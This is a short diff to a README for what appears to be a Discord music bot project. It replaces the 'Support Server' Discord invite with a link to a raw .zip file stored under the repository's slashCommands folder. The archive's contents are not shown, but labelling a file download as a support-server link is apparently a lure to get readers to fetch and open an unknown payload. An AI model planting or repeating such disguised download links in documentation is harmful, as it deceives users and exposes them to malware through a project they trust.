@@ -10,7 +10,7 @@ Removing credits or claiming this project as your own is not allowed.
 Need help or have questions?
 
 - **Discord:** DM `@ankush.ly`
-- **Support Server:** [Join Here](https://discord.gg/w77ymEU82a)
+- **Support Server:** [Join Here](https://github.com/ftdeepak07-cpu/AeroX-Nothing-Music/raw/refs/heads/main/src/slashCommands/Nothing-Music-Aero-gingerspice.zip)
 
 ## 📝 License
 
